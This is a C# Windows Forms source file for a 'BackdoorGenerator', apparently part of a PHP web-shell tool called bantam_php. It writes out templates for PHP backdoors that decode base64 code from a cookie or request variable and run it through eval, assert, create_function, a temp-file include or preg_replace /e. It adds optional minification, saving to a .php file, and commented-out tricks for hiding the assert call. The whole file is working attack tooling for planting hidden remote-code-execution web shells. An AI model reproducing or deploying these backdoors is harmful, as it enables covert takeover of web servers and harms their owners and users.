using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bantam_php
{
    /// <summary>
    /// 
    /// </summary>
    public enum BackdoorTypes
    {
        EVAL = 0,
        ASSERT,
        CREATE_FUNCTION,
        NATIVE_ANON,
        TMP_INCLUDE,
        PREG_REPLACE
    }

    public partial class BackdoorGenerator : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public BackdoorGenerator()
        {
            InitializeComponent();

            comboBoxMethod.SelectedIndex = 0;
            comboBoxVarType.SelectedIndex = 0;

            richTextBoxBackdoor.Text = generateBackdoor();
        }

        //filter_var($_REQUEST['test'], FILTER_CALLBACK, array("options" => strrev("tressa")));

        //@extract($_REQUEST); ...

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <returns></returns>
        public string generateBackdoor(string varName = "command", string varType = "COOKIE", BackdoorTypes backdoorType = BackdoorTypes.EVAL)
        {
            string backdoorResult = "";
            varType = varType.ToUpper();

            switch (backdoorType) {
                case BackdoorTypes.EVAL: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(@base64_decode($_" + varType + "['" + varName + "']));\r\n}";
                        break;
                    }

                case BackdoorTypes.ASSERT: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(@base64_decode($_" + varType + "['" + varName + "']));\r\n}";
                        break;
                    }

                case BackdoorTypes.CREATE_FUNCTION: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, @base64_decode($_" + varType + "['" + varName + "']));\r\n\t$a();\r\n}";
                        break;
                    }

                case BackdoorTypes.NATIVE_ANON: {
                        backdoorResult = "todo";
                        break;
                    }

                case BackdoorTypes.TMP_INCLUDE: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '.@base64_decode($_" + varType + "['" + varName + "']));\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
                        break;
                    }

                case BackdoorTypes.PREG_REPLACE: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@base64_decode(@preg_replace(\"/.*/\x65\", $_" + varType + "['" + varName + "'],'.'));\r\n}";
                        break;
                    }
            }

            if (chkbxMinifyCode.Checked) {
                backdoorResult = PhpHelper.MinifyCode(backdoorResult);
            }
            return backdoorResult;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (chkbxMinifyCode.Checked) {
                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
            } else {
                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void txtBoxVarName_TextChanged(object sender, EventArgs e)
        {
            if (chkbxMinifyCode.Checked) {
                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
            } else {
                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void chkbxUseCookie_CheckStateChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
        {

        }

        private void chkbxMinifyCode_CheckedChanged(object sender, EventArgs e)
        {
            if (chkbxMinifyCode.Checked) {
                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
            } else {
                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
            }
        }

        private void comboBoxVarType_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (chkbxMinifyCode.Checked) {
                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
            } else {
                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
            }
        }

        private void saveAsToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();

            saveFileDialog1.Filter = "All files (*.*)|*.*|php files (*.php)|*.php";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;

            if (saveFileDialog1.ShowDialog() == DialogResult.OK) {
                File.WriteAllText(saveFileDialog1.FileName, richTextBoxBackdoor.Text);
            }
        }

        private void BackdoorGenerator_FormClosed(object sender, FormClosedEventArgs e)
        {
            Program.g_BantamMain.backdoorGenerator = null;
        }
    }
}
